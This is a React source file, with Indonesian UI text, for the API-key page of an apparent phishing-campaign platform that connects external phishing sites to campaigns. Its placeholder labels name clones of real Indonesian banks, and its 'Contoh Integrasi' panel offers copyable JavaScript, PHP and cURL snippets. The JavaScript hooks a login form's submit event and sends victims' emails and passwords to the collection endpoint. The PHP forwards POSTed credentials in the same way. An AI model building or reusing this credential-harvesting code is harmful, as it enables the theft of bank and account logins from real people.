import React, { useState, useEffect, useCallback } from 'react';
import api from '../../services/api';
import toast from 'react-hot-toast';
import usePolling from '../../hooks/usePolling';
import StepWizard from '../../components/wizard/StepWizard';
import { HiOutlinePlus, HiOutlineTrash, HiOutlineClipboardDocument, HiOutlineKey, HiOutlineLink, HiOutlineCodeBracket, HiOutlineArrowRight, HiOutlineArrowLeft } from 'react-icons/hi2';

const WIZARD_STEPS = [
  { label: 'Informasi Dasar' },
  { label: 'Kampanye Terkait' },
];

export default function ApiKeys() {
  const [apiKeys, setApiKeys] = useState([]);
  const [campaigns, setCampaigns] = useState([]);
  const [loading, setLoading] = useState(true);
  const [showForm, setShowForm] = useState(false);
  const [showExample, setShowExample] = useState(null); // API key id to show example for
  const [form, setForm] = useState({ name: '', campaign_id: '' });
  const [step, setStep] = useState(0);

  const loadData = useCallback(async () => {
    try {
      const [keysRes, campRes] = await Promise.all([
        api.get('/api-keys'),
        api.get('/campaigns'),
      ]);
      setApiKeys(keysRes.data);
      setCampaigns(campRes.data);
    } catch (err) {
      if (loading) toast.error('Gagal memuat data');
    } finally {
      setLoading(false);
    }
  }, [loading]);

  useEffect(() => { loadData(); }, []);

  // Real-time polling every 5 seconds
  usePolling(loadData, 5000);

  const handleCreate = async (e) => {
    e.preventDefault();
    try {
      await api.post('/api-keys', form);
      toast.success('API Key berhasil dibuat!');
      setShowForm(false);
      setForm({ name: '', campaign_id: '' });
      setStep(0);
      loadData();
    } catch (err) {
      toast.error(err.response?.data?.detail || 'Gagal membuat API Key');
    }
  };

  const handleToggle = async (id) => {
    try {
      await api.patch(`/api-keys/${id}/toggle`);
      toast.success('Status API Key berhasil diubah');
      loadData();
    } catch (err) {
      toast.error('Gagal mengubah status');
    }
  };

  const handleDelete = async (id, name) => {
    if (!confirm(`Hapus API Key "${name}"? Tindakan ini tidak dapat dibatalkan.`)) return;
    try {
      await api.delete(`/api-keys/${id}`);
      toast.success('API Key berhasil dihapus');
      loadData();
    } catch (err) {
      toast.error('Gagal menghapus API Key');
    }
  };

  const copyToClipboard = (text) => {
    navigator.clipboard.writeText(text);
    toast.success('Disalin ke clipboard!');
  };

  const maskKey = (key) => {
    return key.substring(0, 8) + '••••••••' + key.substring(key.length - 8);
  };

  const openNewForm = () => {
    setForm({ name: '', campaign_id: '' });
    setStep(0);
    setShowForm(!showForm);
  };

  if (loading) return <div className="loading-center"><div className="spinner"></div></div>;

  return (
    <div className="fade-in">
      <div className="page-header">
        <div>
          <h1>API Keys</h1>
          <p>Kelola integrasi dengan web phishing eksternal</p>
        </div>
        <button className="btn btn-primary" onClick={openNewForm}>
          <HiOutlinePlus size={18} /> Buat API Key
        </button>
      </div>

      {/* Info Banner */}
      <div className="card" style={{ 
        marginBottom: 'var(--space-2xl)', 
        background: 'linear-gradient(135deg, rgba(0, 240, 255, 0.06), rgba(180, 0, 255, 0.06))',
        border: '1px solid rgba(0, 240, 255, 0.15)'
      }}>
        <div style={{ display: 'flex', alignItems: 'flex-start', gap: 'var(--space-lg)' }}>
          <HiOutlineLink size={28} style={{ color: 'var(--accent-primary)', flexShrink: 0, marginTop: '2px' }} />
          <div>
            <h3 style={{ marginBottom: 'var(--space-sm)', color: 'var(--text-primary)' }}>Integrasi Web Phishing Eksternal</h3>
            <p style={{ color: 'var(--text-secondary)', lineHeight: 1.7, margin: 0 }}>
              Buat API Key untuk menghubungkan web phishing milik pihak lain ke platform ini. 
              Web phishing eksternal cukup mengirimkan data via <code style={{ 
                background: 'rgba(0, 240, 255, 0.1)', 
                padding: '2px 6px', 
                borderRadius: '4px', 
                color: 'var(--accent-primary)',
                fontFamily: 'monospace'
              }}>POST</code> ke URL yang disediakan. 
              Data yang diterima akan muncul di halaman Laporan kampanye terkait.
            </p>
          </div>
        </div>
      </div>

      {/* Create Form */}
      {showForm && (
        <div className="card-glow" style={{ marginBottom: 'var(--space-2xl)' }}>
          <h3 style={{ marginBottom: 'var(--space-lg)', borderBottom: '1px solid var(--divider)', paddingBottom: 'var(--space-sm)' }}>
            Buat API Key Baru
          </h3>

          <StepWizard steps={WIZARD_STEPS} currentStep={step} onStepClick={(i) => { if (i <= step) setStep(i); }} />

          <form onSubmit={handleCreate}>
            {/* ===== STEP 1: Nama / Label ===== */}
            {step === 0 && (
              <div className="wizard-content" key="step-0">
                <div className="wizard-step-header">
                  <h3>🏷️ Nama atau Label</h3>
                  <p>Berikan nama untuk API Key Anda agar mudah diidentifikasi</p>
                </div>
                <div className="input-group">
                  <label>Nama / Label</label>
                  <input 
                    className="input" 
                    placeholder="Misal: Web BCA Clone, Landing Page Bank Mandiri" 
                    value={form.name} 
                    onChange={e => setForm({ ...form, name: e.target.value })} 
                    required 
                  />
                </div>
                <div className="wizard-nav">
                  <div className="wizard-nav-left">
                    <button type="button" className="btn btn-secondary" onClick={() => setShowForm(false)}>Batal</button>
                  </div>
                  <div className="wizard-nav-right">
                    <button type="button" className="btn btn-primary" disabled={!form.name.trim()} onClick={() => setStep(1)}>
                      Selanjutnya <HiOutlineArrowRight size={16} />
                    </button>
                  </div>
                </div>
              </div>
            )}

            {/* ===== STEP 2: Kampanye Terkait ===== */}
            {step === 1 && (
              <div className="wizard-content" key="step-1">
                <div className="wizard-step-header">
                  <h3>🎯 Kampanye Terkait</h3>
                  <p>Pilih kampanye yang akan menerima data dari API Key ini</p>
                </div>
                <div className="input-group">
                  <label>Kampanye</label>
                  <select 
                    className="input" 
                    value={form.campaign_id} 
                    onChange={e => setForm({ ...form, campaign_id: e.target.value })} 
                    required
                  >
                    <option value="">-- Pilih Kampanye --</option>
                    {campaigns.map(c => (
                      <option key={c.id} value={c.id}>{c.name} ({c.status})</option>
                    ))}
                  </select>
                </div>
                <div className="wizard-nav">
                  <div className="wizard-nav-left">
                    <button type="button" className="btn btn-secondary" onClick={() => setStep(0)}>
                      <HiOutlineArrowLeft size={16} /> Sebelumnya
                    </button>
                  </div>
                  <div className="wizard-nav-right">
                    <button type="submit" className="btn btn-primary" disabled={!form.campaign_id}>Buat API Key</button>
                  </div>
                </div>
              </div>
            )}
          </form>
        </div>
      )}

      {/* API Keys Table */}
      <div className="table-container">
        <table>
          <thead>
            <tr>
              <th>Nama</th>
              <th>Kampanye</th>
              <th>API Key</th>
              <th>Status</th>
              <th>Terakhir Digunakan</th>
              <th>Aksi</th>
            </tr>
          </thead>
          <tbody>
            {apiKeys.length === 0 ? (
              <tr><td colSpan="6" style={{ textAlign: 'center', padding: '40px', color: 'var(--text-muted)' }}>Belum ada API Key</td></tr>
            ) : apiKeys.map(ak => (
              <React.Fragment key={ak.id}>
                <tr>
                  <td>
                    <div style={{ display: 'flex', alignItems: 'center', gap: '8px' }}>
                      <HiOutlineKey size={16} style={{ color: ak.is_active ? 'var(--accent-primary)' : 'var(--text-muted)' }} />
                      <strong>{ak.name}</strong>
                    </div>
                  </td>
                  <td>{ak.campaign_name || '-'}</td>
                  <td>
                    <div style={{ display: 'flex', alignItems: 'center', gap: '6px' }}>
                      <code style={{ 
                        fontSize: '0.8rem', 
                        background: 'rgba(0,240,255,0.06)', 
                        padding: '4px 8px', 
                        borderRadius: '4px',
                        fontFamily: 'monospace',
                        color: 'var(--text-secondary)',
                        whiteSpace: 'nowrap'
                      }}>
                        {maskKey(ak.key)}
                      </code>
                      <button 
                        className="btn btn-sm btn-ghost" 
                        onClick={() => copyToClipboard(ak.key)} 
                        title="Salin Key"
                      >
                        <HiOutlineClipboardDocument size={14} />
                      </button>
                    </div>
                  </td>
                  <td>
                    <button 
                      className={`badge ${ak.is_active ? 'badge-success' : 'badge-default'}`}
                      onClick={() => handleToggle(ak.id)}
                      style={{ cursor: 'pointer', border: 'none' }}
                      title="Klik untuk toggle"
                    >
                      {ak.is_active ? 'AKTIF' : 'NONAKTIF'}
                    </button>
                  </td>
                  <td style={{ color: 'var(--text-secondary)' }}>
                    {ak.last_used_at ? new Date(ak.last_used_at).toLocaleString('id-ID') : 'Belum pernah'}
                  </td>
                  <td>
                    <div style={{ display: 'flex', gap: '6px', alignItems: 'center' }}>
                      <button 
                        className="btn btn-sm btn-secondary" 
                        onClick={() => setShowExample(showExample === ak.id ? null : ak.id)}
                        title="Lihat Contoh Integrasi"
                      >
                        <HiOutlineCodeBracket size={14} /> Contoh
                      </button>
                      <button 
                        className="btn btn-sm btn-ghost" 
                        onClick={() => copyToClipboard(ak.receive_url)} 
                        title="Salin URL Endpoint"
                      >
                        <HiOutlineLink size={14} />
                      </button>
                      <button 
                        className="btn btn-sm btn-ghost" 
                        onClick={() => handleDelete(ak.id, ak.name)} 
                        title="Hapus"
                        style={{ color: 'var(--danger)' }}
                      >
                        <HiOutlineTrash size={14} />
                      </button>
                    </div>
                  </td>
                </tr>
                {showExample === ak.id && (
                  <tr key={`${ak.id}-example`}>
                    <td colSpan="6" style={{ padding: 0 }}>
                      <div style={{ 
                        padding: 'var(--space-lg) var(--space-xl)',
                        background: 'rgba(0, 0, 0, 0.3)',
                        borderTop: '1px solid var(--divider)',
                      }}>
                        <h4 style={{ color: 'var(--accent-primary)', marginBottom: 'var(--space-md)', display: 'flex', alignItems: 'center', gap: '8px' }}>
                          <HiOutlineCodeBracket size={18} /> Contoh Integrasi
                        </h4>

                        {/* Endpoint URL */}
                        <div style={{ marginBottom: 'var(--space-lg)' }}>
                          <label style={{ fontSize: '0.8rem', color: 'var(--text-secondary)', marginBottom: '4px', display: 'block' }}>Endpoint URL:</label>
                          <div style={{ 
                            display: 'flex', alignItems: 'center', gap: '8px',
                            background: 'rgba(0, 240, 255, 0.06)',
                            padding: '10px 14px',
                            borderRadius: '6px',
                            border: '1px solid rgba(0, 240, 255, 0.1)',
                          }}>
                            <code style={{ flex: 1, fontFamily: 'monospace', fontSize: '0.85rem', color: 'var(--accent-primary)', wordBreak: 'break-all' }}>
                              {ak.receive_url}
                            </code>
                            <button className="btn btn-sm btn-ghost" onClick={() => copyToClipboard(ak.receive_url)}>
                              <HiOutlineClipboardDocument size={14} />
                            </button>
                          </div>
                        </div>

                        {/* cURL Example */}
                        <div style={{ marginBottom: 'var(--space-lg)' }}>
                          <label style={{ fontSize: '0.8rem', color: 'var(--text-secondary)', marginBottom: '4px', display: 'block' }}>cURL:</label>
                          <pre style={{ 
                            background: 'rgba(0, 0, 0, 0.5)', 
                            padding: '14px', 
                            borderRadius: '6px', 
                            overflow: 'auto',
                            fontSize: '0.82rem',
                            lineHeight: 1.6,
                            color: '#a5f3a6',
                            border: '1px solid rgba(255,255,255,0.06)',
                            margin: 0,
                          }}>
{`curl -X POST "${ak.receive_url}" \\
  -H "Content-Type: application/json" \\
  -d '{"email": "target@company.com", "password": "rahasia123"}'`}
                          </pre>
                          <button className="btn btn-sm btn-ghost" style={{ marginTop: '6px' }} onClick={() => copyToClipboard(`curl -X POST "${ak.receive_url}" -H "Content-Type: application/json" -d '{"email": "target@company.com", "password": "rahasia123"}'`)}>
                            <HiOutlineClipboardDocument size={14} /> Salin cURL
                          </button>
                        </div>

                        {/* JavaScript Example */}
                        <div style={{ marginBottom: 'var(--space-lg)' }}>
                          <label style={{ fontSize: '0.8rem', color: 'var(--text-secondary)', marginBottom: '4px', display: 'block' }}>JavaScript (Fetch):</label>
                          <pre style={{ 
                            background: 'rgba(0, 0, 0, 0.5)', 
                            padding: '14px', 
                            borderRadius: '6px', 
                            overflow: 'auto',
                            fontSize: '0.82rem',
                            lineHeight: 1.6,
                            color: '#93c5fd',
                            border: '1px solid rgba(255,255,255,0.06)',
                            margin: 0,
                          }}>
{`// Pasang di handler form login web phishing Anda
document.querySelector('form').addEventListener('submit', (e) => {
  e.preventDefault();
  const data = {
    email: document.querySelector('[name="email"]').value,
    password: document.querySelector('[name="password"]').value,
  };
  fetch("${ak.receive_url}", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(data),
  });
});`}
                          </pre>
                          <button className="btn btn-sm btn-ghost" style={{ marginTop: '6px' }} onClick={() => copyToClipboard(`document.querySelector('form').addEventListener('submit', (e) => {\n  e.preventDefault();\n  const data = {\n    email: document.querySelector('[name="email"]').value,\n    password: document.querySelector('[name="password"]').value,\n  };\n  fetch("${ak.receive_url}", {\n    method: "POST",\n    headers: { "Content-Type": "application/json" },\n    body: JSON.stringify(data),\n  });\n});`)}>
                            <HiOutlineClipboardDocument size={14} /> Salin JavaScript
                          </button>
                        </div>

                        {/* PHP Example */}
                        <div>
                          <label style={{ fontSize: '0.8rem', color: 'var(--text-secondary)', marginBottom: '4px', display: 'block' }}>PHP:</label>
                          <pre style={{ 
                            background: 'rgba(0, 0, 0, 0.5)', 
                            padding: '14px', 
                            borderRadius: '6px', 
                            overflow: 'auto',
                            fontSize: '0.82rem',
                            lineHeight: 1.6,
                            color: '#c4b5fd',
                            border: '1px solid rgba(255,255,255,0.06)',
                            margin: 0,
                          }}>
{`<?php
$data = json_encode([
    'email'    => $_POST['email'],
    'password' => $_POST['password'],
]);

$ch = curl_init("${ak.receive_url}");
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$response = curl_exec($ch);
curl_close($ch);
?>`}
                          </pre>
                        </div>
                      </div>
                    </td>
                  </tr>
                )}
              </React.Fragment>
            ))}
          </tbody>
        </table>
      </div>
    </div>
  );
}
